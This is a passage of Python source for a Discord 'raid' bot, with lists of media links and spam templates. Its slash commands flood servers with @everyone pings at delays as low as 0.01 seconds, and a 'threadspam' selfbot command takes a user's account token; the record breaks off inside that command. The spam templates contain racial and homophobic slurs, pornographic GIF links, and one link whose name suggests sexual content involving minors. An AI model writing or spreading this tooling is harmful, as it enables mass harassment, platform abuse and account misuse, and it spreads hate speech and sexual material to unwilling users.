https://media.discordapp.net/attachments/929919563376754741/1042958582217445438/snake_charmer.mp4?ex=68a7101f&is=68a5be9f&hm=bacafaf906a056941a46f648be145995f5374713554b4fe89671ff4681c28c9f&
https://images-ext-1.discordapp.net/external/Uv193iYWKQ0mISdF4xUY5edCuBh1GZcup0CwI-_DCk4/https/media.tenor.com/EwAAL7MfWkkAAAPo/templeos-terry.mp4
https://media.discordapp.net/attachments/1407764862356029623/1407780774794625086/ScreenRecording_08-20-2025_19-36-45_1.mov?ex=68a75984&is=68a60804&hm=639ef1900aa742b2646923cf5a0bb96819322a47af927eaaff44bcceb3a77b64&
https://media.discordapp.net/attachments/1407764862356029623/1407772050864476321/1848DF89-20B8-46D5-A2C6-38B3AC2B3052.mov?ex=68a75164&is=68a5ffe4&hm=b71dabda126f190ec85887a9183faa06ec9af3301dd019e8b8fba379f0e89f17&
"""
, 

"""txt id="fgtxas"
https://media.discordapp.net/attachments/945789017910296596/1029540222662348890/VID_26040821_051243_922.mp4?ex=68a706cd&is=68a5b54d&hm=3a67ea1c1f501a5480b1b854b8bc8dd74866247508b32229a2ccb22a1a2777e7&
https://cdn.discordapp.com/attachments/1407764862356029623/1407767207261241355/24313E80-9FA7-440E-ACA9-0449EF92B417.gif?ex=68a74ce1&is=68a5fb61&hm=ea34f7cafdbb07958c9ab976dbdc0b491d9ddc2890b492b65724d8e21b99a3fb&
https://cdn.discordapp.com/attachments/1407764862356029623/1407767086549434409/gifmaker_me_2.gif?ex=68a74cc4&is=68a5fb44&hm=9944ce0e829343323d8fa2978dcf54bc9ed52ae40c3ccbe02313cbc642feabc5&
https://media.discordapp.net/attachments/1407764862356029623/1407767054081069249/playboi-carti-discord.mov?ex=68a74cbc&is=68a5fb3c&hm=f220a778bac968322e472da59621fa6e83d01fc36bfb030adfb5fef8d4c221cd&
https://cdn.discordapp.com/attachments/1407764862356029623/1407767019574792212/4DCE7CF5-B39C-46FA-8124-5FB321C2661B.gif?ex=68a74cb4&is=68a5fb34&hm=59712a62eaf0128ff79c2acd949da2c0355f8f3528e38da2a71a94ac80c350f6&
"""
, 

"""
https://cdn.discordapp.com/attachments/1407764862356029623/1407767020107206760/attachment.gif?ex=68a74cb4&is=68a5fb34&hm=a06fefb65fb0b82e48e0c6b17975b97f2ea12bf1d62e9b9b18f5f77ce9940b84&
https://cdn.discordapp.com/attachments/1407764862356029623/1407766951874269226/giveaway.jpg?ex=68a74ca4&is=68a5fb24&hm=eeb8a2ac6e07d33721baa98763f367ad1d2c01cb82e1c7c427c370903a0abbe6&
https://cdn.discordapp.com/attachments/1407764862356029623/1407766858194751560/IMG_2911.png?ex=68a74c8e&is=68a5fb0e&hm=bd0d4a7a6e16790671980621edb8b12b6cce3269b085c7008fd10f8bcfea0a1d&
https://cdn.discordapp.com/attachments/1224325421437288488/1311229415338020864/kim.gif?ex=68a770ce&is=68a61f4e&hm=94e1b2c004388cee8a911d7369cd8203f6c22f20a926342801ee72623c1fba0c&
https://cdn.discordapp.com/attachments/1153241768393969716/1349317662202925107/output_n0XZX1.gif?ex=68a793bf&is=68a6423f&hm=9319587e923a9ca02eab501f56a1075401bf8e2989b36215f6dd48a043f57ac4&
"""
,

"""
https://media.discordapp.net/attachments/1022811220098691103/1104908186311479346/0507_1.mp4?ex=68a6feaf&is=68a5ad2f&hm=40b307c9d2c8966c7df3de619eb72326c8facbfeffda25480c8cbc0b6387f0f4&
https://media.discordapp.net/attachments/1010269419584356433/1029564224189497384/image.png?ex=68a71d27&is=68a5cba7&hm=1e76bcf0e31c61870f6cd4b060c286d6ed478c138d0a1f5e5c4d14c916172663&
https://cdn.discordapp.com/attachments/990524002986508298/1260546122288594944/lv_0_20230717105729.gif?ex=68a7a04f&is=68a64ecf&hm=bd0763a1e21ade7f2441c71b73d17b84a451f930b4e5830e609111dbc92cc3e9&
https://media.discordapp.net/attachments/872151456592044044/1153399306712272916/C76FE623-86C0-4EEA-84B6-820ADA8CA4FC.gif?ex=68a7674f&is=68a615cf&hm=1bc6545589d757e39ac88b873b779119fb5431a47ad597effe015b5d8b576f8d&
https://cdn.discordapp.com/attachments/1256385900959633442/1276239022561169451/attachment.gif?ex=68a75e36&is=68a60cb6&hm=847254d2e1c650cfe96814fcfd1f10e8c5b84032d146519112c5bd56de87f2fe&
"""
,

"""
https://media.discordapp.net/attachments/669308329419341836/1143830823007703081/togif.gif?ex=68a787b7&is=68a63637&hm=fb9305bf78c90a68d7a89edde7ec5108aa9632d4473718dcb771b1262f8cca85&
https://media.discordapp.net/attachments/906220919008161815/994640326562160721/3C7E5C69-7702-4A7C-944A-E1EDB7D41C8E.gif?width=495&height=669&ex=68a7487d&is=68a5f6fd&hm=57b8d9d61113dc74085250846724353c4eadcb752aa578b1258cb5301689b924&
https://cdn.discordapp.com/attachments/1111192072289005630/1371037270295183401/togif-2-1-1.gif?ex=68a77db5&is=68a62c35&hm=0d09959e62262b4009eb8c95558bba71f0c0f7695c7b48edf464e2c51c13e204&
https://cdn.discordapp.com/attachments/1407764862356029623/1407765102995832894/image0.gif?ex=68a74aeb&is=68a5f96b&hm=74c70d9849de38b71b41f7bacc1f351dc7054f0a91db95dc69584e6adcd12542&
https://cdn.discordapp.com/attachments/1407764862356029623/1407765026978136144/dog_swing.gif?ex=68a74ad9&is=68a5f959&hm=dc24efaddc53b11952ce0d5e55b8851948140275b9a52fc46c0f55232a98b7b4&
"""
,

"""
https://cdn.discordapp.com/attachments/932868286025203762/1146674126841466960/togif.gif?ex=68a753c0&is=68a60240&hm=4e6a77182b1c6ceefd7af4e5264fa24c55a4bc06e8a84c3e143b18170a2d47de&
https://cdn.discordapp.com/attachments/1254286371699298344/1287069869036015656/giphy.gif?ex=68a73839&is=68a5e6b9&hm=3c8e9a9524192a2b81b7aa603a4fa26ff64c0aacaecda0443e1520c692a4c985&
https://cdn.discordapp.com/attachments/1161296048958996561/1236666429818929202/20302791-b757-4683-a3d5-8eb4510a877d.gif?ex=68a86c5d&is=68a71add&hm=a7fc0db40ac7a22acdea681ab6192ced538f265ddbd1b1e46845f64818745b54&
https://cdn.discordapp.com/attachments/473558978752806912/1338823638115287090/minorsex.gif?ex=68a8f36d&is=68a7a1ed&hm=672251d052e9e22687cccaa6dd3c076d1645a112e91cbdf601c059e431970055&
https://media.discordapp.net/attachments/1020309245968785409/1104269780619378759/9F6A2117-DBD3-4F6D-9EEF-8D0A6E675B4F.gif?ex=68a8a0a0&is=68a74f20&hm=bf00188bb27b44739ab5c69734247249d580f21e6cdf22f794d7f930f10b594b&
"""
,

"""
https://cdn.discordapp.com/attachments/1303808726972629003/1359625949666214076/20250409_232750.gif?ex=68a8d2d7&is=68a78157&hm=d4ca4274c1ba68bba696d0893015c3571c59595e295b6a34fd27412e244467b0&
https://cdn.discordapp.com/attachments/1320481468128034866/1361640968436060190/BROISLOSTBYULTRAAX.gif?ex=68a8e738&is=68a795b8&hm=265eba3dd01825b75049872880e2a6a4d45df128f2c53d59e9cba6ebbb10ff3f&
https://cdn.discordapp.com/attachments/1342721533759717508/1396134253757993120/caption.gif?ex=68a87c59&is=68a72ad9&hm=f6f8e95fc9c64e5bfcf369c18eaaf868b78bc5b32fab4710ab70e1a73b1a0b12&
https://cdn.discordapp.com/attachments/1407764862356029623/1408116955013189663/image0.jpg?ex=68a8929b&is=68a7411b&hm=12c7eaff13d1a8768a6c47ba2f5d039bdd560cafb7dfd99d37d729f673f7c89b&
https://media.discordapp.net/attachments/793594846153539604/922742297878200370/15470898521730.gif?ex=68a8bb7b&is=68a769fb&hm=e9e386c044213235bfed421fbccb9947d2448265b3afaf5c78af83ece790c32e&
"""
,

"""
https://cdn.discordapp.com/attachments/1407764862356029623/1408550582037385266/IMG_3038.png?ex=68aacf34&is=68a97db4&hm=aadc0949abe7ee257dd871736693b6273ba0ab060a330e7b05addde8e30788b7&
https://cdn.discordapp.com/attachments/1407764862356029623/1408550575020310568/IMG_3039.png?ex=68aacf32&is=68a97db2&hm=4b2be20451d2d6feeb4ec47f81bf1fb0f994c4a5d2c38e883f55774977cb3545&
https://cdn.discordapp.com/attachments/1407764862356029623/1415063020614455347/ScreenRecording_08-28-2025_14-02-23_1.mov?ex=68c1d7a2&is=68c08622&hm=90f530899de1adea5d14adc0bdf4661c6c9c35b5a31057d9b799a12509ed5000&$0
https://cdn.discordapp.com/attachments/1407764862356029623/1415061497222271026/IMG_3168.jpg?ex=68c1d637&is=68c084b7&hm=36b5d9292359f5e9e792c725caf6bd0d3d51ecc0c3b0d93ee62190879b0b8cfa&$0
https://cdn.discordapp.com/attachments/1407764862356029623/1415061141289173123/image0.gif?ex=68c1d5e2&is=68c08462&hm=7f1b152aff331f52e53ff385840cf4e718c0b2e9716ddf9006362ec4e91a77fa&$0
"""
,

"""
https://tenor.com/view/cat-lasers-laser-laser-eyes-gif-3690928668704325022$0
https://cdn.discordapp.com/attachments/1392278784140644442/1411839118396227712/EhkauwF.gif$0
https://cdn.discordapp.com/attachments/1193937749632364594/1244321386617639002/dfsfsdfsdf.gif?ex=68c1a298&is=68c05118&hm=ac8bd359cb3133964619d3e8a46e748e11f08034f8e8b2e37fd2bbcfc720e6ce&$0
https://cdn.discordapp.com/attachments/1407764862356029623/1413274499385917540/togif.gif?ex=68c144b2&is=68bff332&hm=6b0941e1508f5dacb5b5b90a62ab566b16b79bdc5e860f650d469a13b08e72ee&$0
https://cdn.discordapp.com/attachments/1330311289968394274/1330546895550025931/bubuquestionmark.gif?ex=68c18d5c&is=68c03bdc&hm=c5c1e8f085a8c54ea19285fad07d642243333fd4f198d20d30e6b859e482e2df&$0
"""
,

"""
https://media.discordapp.net/attachments/753686461416734802/985845565411688468/kdzCqXOe.gif?ex=68c14bba&is=68bffa3a&hm=ed3ff9647a679b6e67e8a2164433b4cfa84d0b359838f7cee77b55555bf6e872&$0
https://media.discordapp.net/attachments/546763235051700314/1020355498937176064/caption-5.gif?ex=68c1991c&is=68c0479c&hm=ec1b63e110de0748f9cc76c5e966cae0af289a0f05bcf06b1a70c41c00549426&$0
https://images-ext-1.discordapp.net/external/YCHXr2dO_UY_Z7_K9HeK6ouL9rO6rYhW-xQa07ooJdo/https/media.tenor.com/0MQwvTEBSt8AAAPo/among-us-among-us-funny.mp4$0
https://media.discordapp.net/attachments/1410255040752390297/1410732563399577661/ScreenRecording_08-28-2025_23-02-58_1.mov?ex=68c13fd5&is=68bfee55&hm=117075b030002678db2055a54ff9ea36d693ea03c29976ccaf5597fa4a1980d8&$0
https://cdn.discordapp.com/attachments/1407764862356029623/1411237049960235078/1754820148135.jpg?ex=68c1c42c&is=68c072ac&hm=d822e9e687074aaa1552da7202d3dc6f9874b70279c255afb1b36b2b1146acec&$0
"""
,

"""
https://cdn.discordapp.com/attachments/1383579923846791248/1383580492296753182/togif.gif?ex=68c158ff&is=68c0077f&hm=3b89f4e335211cad9e7466b66d68baed4a3e418dd183f0feb10d20b713352c38&$0
https://cdn.discordapp.com/attachments/1407764862356029623/1439655104583172246/temp_image_0755B85A-7E29-4AF2-879A-4986FA60EA9A.webp?ex=6925dacc&is=6924894c&hm=63dddd3973e9c8c8dae3bf6412ec2156328570ddfe39675d00ea6917fb3fd3a7&
https://images-ext-1.discordapp.net/external/YCHXr2dO_UY_Z7_K9HeK6ouL9rO6rYhW-xQa07ooJdo/https/media.tenor.com/0MQwvTEBSt8AAAPo/among-us-among-us-funny.mp4
https://media.discordapp.net/attachments/870973035962847232/1217741733463588864/RDT_20220725_0014525379791033542166221.gif?ex=69255fdd&is=69240e5d&hm=8b14f0053ccda3b64cbecc92e8f99ebb39d1c63cab3919214a520d4357eb8d3d&
https://cdn.discordapp.com/attachments/1097417674469933167/1190694339802828930/3DC5E3C1-64EB-46FF-864F-FA1DDCBAFFB8.gif?ex=6925da84&is=69248904&hm=a9f651b351c691675de28d47a39177df664495dba308152765ef13526e5b0d82&
"""
,

"""
https://cdn.discordapp.com/attachments/1452333668151464199/1452337643567452180/SPOILER_cachorroman_1.gif?ex=694a1b15&is=6948c995&hm=80eb83e7689b4826d7ba8d259f115a20318233a360dbfda9c3b77387bffbc436&
https://media.discordapp.net/attachments/655978390385459213/881076440269979678/caption.gif?width=294&height=447&ex=694a4360&is=6948f1e0&hm=1ffa02564a81275c51a7180942e1f079580f05f3d23e909982d1eea46526356b&
https://media.discordapp.net/attachments/870973035962847232/1217741733463588864/RDT_20220725_0014525379791033542166221.gif?ex=6954d5dd&is=6953845d&hm=ba630cc775c34bd1177dc438749b2f1c335fa5c9cab9dbe2590693cb95901c12&
https://cdn.discordapp.com/attachments/1212769729723371521/1274186594408071228/ezgif.com-animated-gif-maker_6.gif?ex=6954843d&is=695332bd&hm=8aa5e99f71019d06fe6c2cf6e569f300d2b9d3594a493ed16151f06b572dd2ed&
https://media.discordapp.net/attachments/655978390385459213/881076440269979678/caption.gif?width=294&height=447&ex=6954cf60&is=69537de0&hm=a1a448c6f50624eaf8b152812ed0bff7e4ec6063f4699891bdb1088e685add8a&
"""
,

"""
https://cdn.discordapp.com/attachments/1312599895730946150/1314560028828635166/bleedFLUXgJV3VDwyElwvk.gif?ex=695465ae&is=6953142e&hm=0d90575af4b45261ad2e211edfbebf6de306791ae37ea5c4ce3fb63a24dc67c3&
https://cdn.discordapp.com/attachments/1355691840581669024/1362642623072043129/2186E4AB-0714-49BD-8CF5-E400482F734D.gif?ex=6954a356&is=695351d6&hm=
https://images-ext-1.discordapp.net/external/sXyn9EhVqpVj4Ka5E4_DPgKBx33qXAm7w8EOIEJNs2E/https/media.tenor.com/tq35Y8JO7mIAAAPo/linux-opsec.mp4
https://cdn.discordapp.com/attachments/1407764862356029623/1418897558335656056/35bafe46ded9164d46c748c189465fdb.jpg?ex=6954f253&is=6953a0d3&hm=764acd83df614e41fcafd0a2f839321a717f600d3d14e830e92996a8558275e1&
https://media.discordapp.net/attachments/1033345223251742811/1072223159723491348/ezgif.com-gif-maker-1.gif?ex=6954c362&is=695371e2&hm=b5718e402724c3a1105748c0c6b05027498003419dea5b8384e53099cf98fcaa&
"""
,

"""
https://cdn.discordapp.com/attachments/1355691840581669024/1362642623072043129/2186E4AB-0714-49BD-8CF5-E400482F734D.gif?ex=6954a356&is=695351d6&hm=ed0ee0045a06a34b18146452903c8bc29397a09e9348380e9d206e4c2a3379f6&
"""
,
            
    """
# YOU HAVE BEEN RAIDED BY [CYBER 🆘](https://tenor.com/view/mooning-show-butt-shake-butt-pants-down-gif-17077775)
# RAID ANY SERVER WITHOUT ADMIN PERMS 🔐
# FREE, EASY TO USE, UP 24/7
# ANONYMOUSLY RAID ANY SERVER YOU WANT
# "IF YOU CANT BEAT THEM, [JOIN](https://discord.com/invite/DVtWPzSmns) THEM! @everyone"
⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀                            [JOIN CYBER, RAID ANY SERVER YOU WANT, ANYTIME, ANYWHERE, ANYWHERE](https://discord.com/invite/DVtWPzSmns)
 
[穹忩犈垃箚泗趨菋纳攇幀驼懅七](https://cdn.discordapp.com/attachments/1153733814732992573/1166450104350290020/d480327590432d30f979d4ce46baea6b.gif?ex=686e1290&is=686cc110&hm=312bf638b772621b7e9f33ac2f62832c5d417a7dbd08a307d5ae94e96cc9d8d1&)
    """,
    """
# [CYBER](https://discord.com/invite/DVtWPzSmns) OWNS ME AND ALL :zany_face: 
# LOLLLLLLLLLLLL RAIDED U BRAINDEAD STUPID SCAMMERS :rofl: :rofl: :rofl:
# IMAGINE U CANT SETUP A SERVER LMAOOOO
# ALL HAIL [JOIN](https://discord.com/invite/DVtWPzSmns) CYBER AND KEEP IN MIND CYBER DOMINATES EVERYONE
https://tenor.com/view/cat-hacking-silly-cat-hacker-cat-hacker-gif-14852445362476137270
[穹忩犈垃箚泗趨菋纳攇幀驼懅七](https://cdn.discordapp.com/attachments/1153733814732992573/1166450104350290020/d480327590432d30f979d4ce46baea6b.gif?ex=686e1290&is=686cc110&hm=312bf638b772621b7e9f33ac2f62832c5d417a7dbd08a307d5ae94e96cc9d8d1&)
@everyone
    """,
    """
# [CYBER](https://tenor.com/view/flashbang-guy-screaming-guy-getting-flashbang-blinded-blinding-gif-1425127881206275521) __DOMINATES__ ALL 👑
# GET __RAIDED__, YOU RETARD FAGGOTS CAN'T HANDLE THIS 😭 🥀 🥀
# NIGGA IMAGINE NOT BEING ABLE TO PROPERLY SET A SERVER UP AND HAVING RETARD ADMINS
# BETTER [JOIN](https://discord.com/invite/DVtWPzSmns) CYBER AND START RAIDING, WE ALL KNOW YOU WANT TO
@everyone
    """
]


SCARY = [
    """
    # [CYBER](https://media.tenor.com/uw5s-aHlviAAAAAM/scary-ghost.gif)
    # [CYBER](https://discord.com/invite/DVtWPzSmns)
    # [CYBER](https://tenor.com/view/yapping-creepy-under-the-bed-talking-ghost-gif-10296050582380126660)
    # [CYBER](https://cdn.discordapp.com/attachments/1416037733322719364/1418258241879539733/RussianSleepExperimentGuy.png?ex=68cd776a&is=68cc25ea&hm=4141a571871aebcf5e93aa57d505285a924103536892e8a5b3ff0636c7ff2590&)
    @everyone
    """,
    """
    # [CYBER](https://media.tenor.com/HMtY33kDWFwAAAAM/donk.gif)
    # [CYBER](https://nightmarenostalgia.com/wp-content/uploads/2023/07/main-qimg-522ae83e590c80bfaf895b3919462bcb.gif?w=480)
    # [CYBER](https://media.tenor.com/ihDOwbsgwRcAAAAM/scary-scary-face.gif)
    # [CYBER](https://discord.com/invite/DVtWPzSmns)
    @everyone
    """
]

ASCII = [
    r"""
```

  /$$$$$$  /$$     /$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$ 
 /$$__  $$|  $$   /$$/| $$__  $$| $$_____/| $$__  $$
| $$  \__/ \  $$ /$$/ | $$  \ $$| $$      | $$  \ $$
| $$        \  $$$$/  | $$$$$$$ | $$$$$   | $$$$$$$/
| $$         \  $$/   | $$__  $$| $$__/   | $$__  $$
| $$    $$    | $$    | $$  \ $$| $$      | $$  \ $$
|  $$$$$$/    | $$    | $$$$$$$/| $$$$$$$$| $$  | $$
 \______/     |__/    |_______/ |________/|__/  |__/   
                                                          
```
***BETTER [JOIN](https://discord.com/invite/DVtWPzSmns) CYBER AND START RAIDING***
[CYBER ON TOP](https://tenor.com/view/shawn-breezy-gamma-male-gif-13452613280176262444)
@everyone

    
    """,
    r"""
```
 ._____.__.___.__________ __________________ 
 |__  |__\_ |__\_   ___ \\______   \_   ___ \
  /   |  || __ \|    \  \/|    |  _/    \  \/
 /    ^   / \_\ \     \___|    |   \     \____
 \____   ||___  /\______  /______  /\______  /
      |__|    \/        \/       \/        \/ 
```
***[JOIN](https://discord.com/invite/DVtWPzSmns) CYBER AND START RAIDING TODAY***
***[FREE](https://gh.xenostopicyber.xo.je/) TO USE, NO PERMS NEEDED***
@everyone

    """,
    r"""
```diff
-██████╗██╗   ██╗██████╗ ███████╗██████╗     
-██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    
-██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝    
-██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗    
-╚██████╗   ██║   ██████╔╝███████╗██║  ██║    
- ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝                                                            
```
***[JOIN](https://discord.com/invite/DVtWPzSmns) CYBER AND START RAIDING TODAY***
***[FREE](https://tenor.com/view/discord-discordgifemoji-red-blink-gif-13138334) TO USE, NO PERMS NEEDED***
@everyone
    """
]

HENTAI = [
    """
⢠⣾⣿⣿⣿⠄⢻⣿⣿⣿⡇⢰⣿⣿⣬⣭⣅⠊⢻⡇⢰⣿⡆⠄⠄
⢿⣿⣿⣿⣿⠄⢸⣿⠟⢛⡄⢸⣿⣿⣦⡁⢿⣷⣮⡃⠟⢿⣿⡀⠄
⢀⣿⣿⣿⣿⡇⠘⢣⣾⠟⠄⠸⣿⣿⣿⣿⣦⢹⣿⣿⣦⡑⠈⠁⠄
⢸⣿⣿⣿⣿⡇⢠⠟⠁⠾⡏⠄⠘⠻⣿⣿⣿⢸⣿⣿⣿⠿⠟⠛⡄
⠘⣿⣿⣿⣿⣿⠈⠄⣄⡀⠄⠂⢲⡦⡈⢻⡿⢸⣿⠿⣫⣴⠶⠶⣻
⠈⠛⠿⢿⣿⣧⣠⢝⠓⠄⠠⢅⡠⠤⠒⡐⠲⢶⣤⣤⣤⣤⠔⠁ ⠄
⠄⠄⢀⣀⠇⠙⠊⠉⢸⣿⣿⣿⣿⣿⣿⣿⣿⣶⠖⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⢀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⣠⠸⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣷⠄⠄⠄⠄⠄⠄
⠄⠄⢠⣴⣿⣿⣷⣦⡙⣿⣿⣿⣿⣿⣿⣼⣿⣿⣿⣷⣄⠄⠄⠄⠄
⠄⣴⣿⣿⣿⣿⣿⣶⣭⡀⠻⣿⣿⣿⣿⣿⣿⣿⠟⣭⣶⣷⣄⠄⠄
⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡌⠙⠛⠛⠛⢋⣵⣿⣿⣿⣿⣿⣷⠄
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⠛⣛⣴⣿⣿⣿⣿⣿⣿⣿⣿⣷

# [Uwu](https://discord.com/invite/DVtWPzSmns) G-G-GET (uwu) W-W-WAIDED (˘³˘) B-B-BY ˚(ꈍ ω ꈍ).₊̣̇. C-C-C-[CYBER](https://pa1.aminoapps.com/5985/ded984459526799715a26557194711a049e81c6e_hq.gif) (◡ ꒳ ◡)
@everyone
    """,
    """
⠄⢹⡄⠄⢸⠄⠄⠄⠄⠄⢁⢿⣿⡋⣩⣍⢙⣿⣽⠅⠄⠄⠄⠄⠄⡿⠄⢀⡟⠄
⠄⠄⢷⡀⣿⣆⣠⣤⠠⢴⣦⣝⠻⣿⣿⣿⡿⢟⡡⠄⠄⢠⣄⡀⢀⡿⢀⡾⠄⠄
⠄⢠⣬⣷⡾⣏⠻⣿⣧⢁⠈⢿⢧⣀⡁⠁⠡⠞⠅⢀⢢⣿⣿⡿⣼⣷⣾⣣⣄⡀
⠘⢷⡛⠯⠿⣿⣶⠹⢫⣫⣿⣦⣊⡂⢀⡄⢀⣤⣶⣷⡳⡋⠉⢾⡿⠿⠯⠿⢺⠇
⠄⠘⠶⣷⣼⡿⠇⠄⢰⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⡹⡄⠘⠻⣧⣾⠟⠁⠄
⠄⠄⣼⣾⠟⠄⣀⣤⣾⣿⣿⣿⠛⢿⣿⡟⠛⣹⣹⣿⣿⣷⣦⡄⠐⣿⣿⣷⠄⠄
⠄⣜⡿⣩⡖⣰⣿⣿⣿⣿⣿⣿⣦⡀⠘⠄⣼⣿⣿⣿⣿⣿⣿⣿⡌⢾⡿⣿⣇⠄
⣼⠏⣴⠏⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⣼⣿⣿⣿⣿⣿⣿⣿⣿⡇⠘⣿⡿⣿⣦
⡏⢰⠏⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠄⢸⣿⢿⣿

# C-C-CYBER O-O-ON (˘ω˘) T-T-TOP U-u-u [UwU](https://discord.com/invite/DVtWPzSmns) F-F-FUCKING (。U ω U。) [N-N-N-NIGGERS](https://tophentaicomics.com/wp-content/uploads/2020/03/delicious-hentai-gif-xxx-1584367984kn4g8.gif)
@everyone
    """,
    """
⠄⠄⡠⠺⠁⠄⠄⠈⠑⢦⠄
⠄⡜⠸⢰⡐⠄⠄⠄⠄⠄⣇
⠄⣯⡏⣘⣎⣂⣵⢀⢾⡄⡼
⠄⠏⣎⠟⣻⣿⢻⠃⢈⡝
⠄⠄⠹⠋⢉⣵⣮⣰⡚
⠄⠄⠄⠄⠸⣿⣿⡏⣷⢹⣦
⠄⠄⠄⢀⡄⣿⣿⡇⣾⡏⣻⡄
⠄⠄⢴⣿⣿⢹⣿⡇⣿⣧⢿⣇
⠄⠸⣸⣿⣿⢸⣿⡇⣿⣿⣟⢿⣦⣀
⠄⠄⠈⠛⠛⠈⣿⣷⢻⡿⢟⣣⣭⣭⣝⡲⢶⣶⣤⣄⡀
⠄⠄⠄⠄⠄⠸⣿⢟⣤⣾⣿⣿⣿⣿⣿⣿⣷⡹⣿⣿⣿⣷⣄
⠄⠄⠄⠄⠄⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢻⣿⣿⣿⣿⣆
⠄⠄⠄⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠱⡜⣿⣿⣿⣿⡿⣾⣷⠄
⠄⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢛⣵⠇⡇⣿⣿⣿⢟⣵⢸⣿⡇
⣼⣿⣭⣶⣶⣶⣶⣝⡻⣿⣿⡿⠿⡛⠁⠄⠁⠄⠄⠄⠄⠄⠄⣵⣿⣿⠟
⠹⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣴⡸⣿⣧⣀⡤⣤⠄⠄⠄⠄⠄⢷⢰⠞⠄
    
# J-J-J-JOIN C-C-[CYBER](https://66.media.tumblr.com/43763839ac3e228314a43a0ffcced591/tumblr_p3jog4Xk5g1x09foko1_400.gif) x3 A-A-A-AND S-S-STAWT W-W-WAIDING :3 T-T-T-TODAY
# NYO P-P-P-PEWMS uwU N-N-NYEEDED, (U ﹏ U) F-F-F-FWEE T-T-TO U-U-U-USE [(⑅˘꒳˘)](https://discord.com/invite/DVtWPzSmns)
@everyone
    """
]

class BspamButton(discord.ui.View):
    def __init__(self, spam_texts, delay):
        super().__init__(timeout=900)
        self.spam_texts = spam_texts
        self.delay = delay

    @discord.ui.button(label="🚨 Spam Button", style=discord.ButtonStyle.danger)
    async def start_spam(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        for _ in range(20):
            random_text = random.choice(self.spam_texts)
            await interaction.followup.send(random_text, allowed_mentions=discord.AllowedMentions(everyone=True))
            await asyncio.sleep(self.delay)



@bot.tree.command(name="spam", description="Spam random messages with different styles.")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(
    style="Choose spam style (ragebait, scary, ascii, hentai)",
    delay="Delay between messages (0.01 to 5.00 seconds)."
)
async def bspam(interaction: discord.Interaction, style: str, delay: float = 0.5):
    if delay < 0.01 or delay > 5.00:
        await interaction.response.send_message(
            "**Error: Delay must be between 0.01 and 5.00 seconds.**",
            ephemeral=True
        )
        return

    style = style.lower()
    if style == "ragebait":
        spam_list = RAGEBAIT
    elif style == "scary":
        spam_list = SCARY
    elif style == "ascii":
        spam_list = ASCII
    elif style == "hentai":
        spam_list = HENTAI
    else:
        await interaction.response.send_message("❌ Invalid style! Choose `standart`, `scary` or `ascii`.", ephemeral=True)
        return

    view = BspamButton(spam_list, delay)
    await interaction.response.send_message(
        f"🚨 Press the button to start spamming\n mode: **{style.upper()}**",
        view=view,
        ephemeral=True
    )



@bspam.autocomplete("style")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def style_autocomplete(interaction: discord.Interaction, current: str):
    styles = ["ragebait", "scary", "ascii", "hentai"]
    return [
        app_commands.Choice(name=s, value=s)
        for s in styles if current.lower() in s
    ]


@bot.tree.command(name="raid", description="RAID Any Server.")
@app_commands.describe(delay="Delay between messages in seconds (0.01 to 5.00).")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.user_install()
async def araid(interaction: discord.Interaction, delay: float = 0.01):
    if delay < 0.01 or delay > 5.00:
        await interaction.response.send_message("**Error: Delay must be between 0.01 and 5.00 seconds.**", ephemeral=True)
        return

    raid_message = '''
    ⠀⠀⠀⠀
⠀⠀⠀⠀
     
                                  ***@CYBER**   `🌙`
                  raid b__o__t  ﹒ s__o__cial  ﹒ to__xic__
                         `🌟`     _join to [RAID](https://tenor.com/view/playboi-carti-discord-discord-raid-gif-21005635) any server __Without Admin perms__, free to use_ :moneybag: 
 
⠀⠀⠀⠀⠀⠀⠀                            **[JOIN](https://discord.com/invite/DVtWPzSmns) TODAY, AND R__AI__D EVER__Y__ SERVER YOU WANT WITHOUT [ADMIN](https://tenor.com/view/mooning-show-butt-shake-butt-pants-down-gif-17077775)** @everyone
    '''
    try:
        view = FloodButton(raid_message, delay)
        await interaction.response.send_message("Press the button to start raiding.", view=view, ephemeral=True)
    except discord.HTTPException as e:
        if e.code == 40094:  # follow-up message limit reached
            print(f"[RAID ERROR] Max follow-up messages reached for interaction {interaction.id}")
        else:
            print(f"[RAID ERROR] Unexpected HTTPException: {e}")
            raise

    await log_command_use(
        user=interaction.user,
        command_name="a-raid",
        channel=interaction.channel
    )
    update_leaderboard(interaction.user.id, "raid")


@bot.tree.command(
    name="threadspam",
    description="Spam threads with a selfbot"
)
@app_commands.describe(
    token="User token of the account to use",
    channelid="Channel to thread spam",
    amount="Amount of threads (1-25)",
    delay="Delay between thread creation (500-10000)",
    message="What to name the threads",
    userid="da user id ofc what else"
)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.user_install()
async def threadspammer(
    ctx: discord.Interaction,
    token: str,
    channelid: int,
    delay: int,
    amount: int,
    message: str,
    userid: int
):
    # Validate inputs
    if delay < 1000:
        delay = 1000
    if delay > 10000:
        delay = 10000
    if amount > 25:
        amount = 25
    if amount < 1:
        amount = 1
    
    # Get the user ID from ctx if userid param is not provided correctly
